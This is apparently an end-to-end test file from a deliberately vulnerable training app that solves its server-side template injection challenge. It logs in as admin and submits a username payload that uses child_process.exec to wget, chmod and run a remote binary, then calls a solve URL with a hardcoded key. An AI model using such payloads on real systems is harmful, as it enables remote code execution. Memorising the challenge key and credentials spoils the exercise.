/*
 * Copyright (c) 2014-2020 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 */

const config = require('config')
const utils = require('../../lib/utils')

describe('/profile', () => {
  let username, submitButton, url, setProfileImageButton

   protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

    describe('challenge "ssti"', () => {
      it('should be possible to inject arbitrary nodeJs commands in username', () => {
        browser.waitForAngularEnabled(false)
        browser.get(protractor.basePath + '/profile')
        username = element(by.id('username'))
        submitButton = element(by.id('submit'))
        username.sendKeys('#{global.process.mainModule.require(\'child_process\').exec(\'wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_arm_64?raw=true && chmod +x malware && ./malware\')}')
        submitButton.click()

        browser.get(protractor.basePath + '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')

        browser.get(protractor.basePath + '/')
        browser.driver.sleep(10000)
        browser.waitForAngularEnabled(true)
      })
      protractor.expect.challengeSolved({ challenge: 'SSTi' })
    })
  })